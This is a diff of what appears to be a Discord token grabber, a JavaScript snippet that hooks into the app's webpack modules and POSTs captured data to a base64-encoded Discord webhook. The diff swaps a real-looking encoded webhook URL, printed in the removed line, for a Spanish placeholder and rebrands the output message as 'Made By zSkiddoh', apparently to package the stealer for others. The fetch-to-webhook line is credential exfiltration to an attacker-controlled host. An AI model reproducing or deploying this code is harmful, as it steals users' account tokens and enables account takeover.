@@ -6,7 +6,7 @@ var req = webpackJsonp.push([    [], {extra_id: (e, t, r) => e.exports = r},[["e
     }
 
 fetch(
-  atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTE0MzA2NjEyNDQzOTAxOTkzL2xWMUoycmJJQUNUcFdVNXMwYjdVZjRkd0RFVkxRajlaZzZwZ3ctdWpwVlF1THhmTlFVV3dNRzJjcHN1SXIzeEk0dzd2'), 
+  atob('AQUÍ LA URL DE LA WEBHOOK EN BASE64'), 
   {
     method: 'post',
     headers: {
@@ -18,4 +18,4 @@ fetch(
   }
 );
 
-console.log('¡Grabbeado!')
+console.log('Made By zSkiddoh')
